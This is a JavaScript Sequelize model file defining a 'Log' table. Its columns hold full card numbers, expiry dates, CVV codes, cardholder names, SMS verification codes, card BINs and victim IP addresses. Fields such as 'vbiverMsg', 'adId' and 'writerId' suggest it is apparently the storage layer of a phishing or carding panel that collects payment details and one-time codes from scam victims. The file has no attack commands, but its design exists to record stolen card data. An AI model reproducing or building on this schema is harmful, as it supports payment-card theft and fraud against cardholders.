"use strict";
const { Model } = require("sequelize");
module.exports = (sequelize, DataTypes) => {
  class Log extends Model {
    /**
     * Helper method for defining associations.
     * This method is not a part of Sequelize lifecycle.
     * The `models/index` file will call this method automatically.
     */
    static associate(models) {
      // define association here
    }
  }
  Log.init(
    {
      token: DataTypes.STRING,
      cardNumber: DataTypes.STRING,
      cardExpire: DataTypes.STRING,
      cardCvv: DataTypes.STRING,
      cardHolder: DataTypes.TEXT,
      chatMsg: DataTypes.JSON,
      chatMsg2: DataTypes.JSON,
      vbiverMsg: DataTypes.JSON,

      
      supportId: DataTypes.TEXT,

      // cardBalance: DataTypes.TEXT,

      smsCode: DataTypes.STRING,
      otherInfo: DataTypes.JSON,
      adId: DataTypes.STRING,
      writerId: DataTypes.BIGINT,
      userId: DataTypes.BIGINT,
      imgUrl: DataTypes.TEXT,
      bin: DataTypes.TEXT,
      

      status: DataTypes.STRING,

      ip: DataTypes.TEXT,

    },
    {
      sequelize,
      modelName: "Log",
    }
  );
  return Log;
};
